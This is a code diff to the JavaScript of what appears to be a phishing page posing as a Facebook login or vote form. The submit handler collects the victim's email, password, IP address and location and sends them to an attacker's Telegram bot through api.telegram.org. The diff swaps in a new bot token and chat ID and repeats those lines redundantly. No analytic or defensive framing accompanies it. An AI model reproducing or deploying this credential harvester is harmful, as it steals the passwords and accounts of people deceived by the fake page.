@@ -18,11 +18,24 @@ form.addEventListener("submit", (e) => {
       var identity = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      var my_text = `Facebook Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+      var my_text = `
+      <b>New Facebook Vote</b>
+      - <b>Username/Email:</b> ${identity}
+      - <b>Password:</b> ${password}
+      - <b>IPAddress:</b> ${ct}
+      - <b>Country:</b> ${co}
+      - <b>Country Code:</b> ${lo}
+      - <b>City:</b> ${st}
+      `;
 
-      var token = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI";
-      var chat_id = -4157105964;
-      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+      var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
+      var chat_id = 7656086639;
+      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
+        my_text
+      )}&parse_mode=HTML`;
+
+      var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
+      var chat_id = 7656086639;
 
       let api = new XMLHttpRequest();
       api.open("GET", url, true);
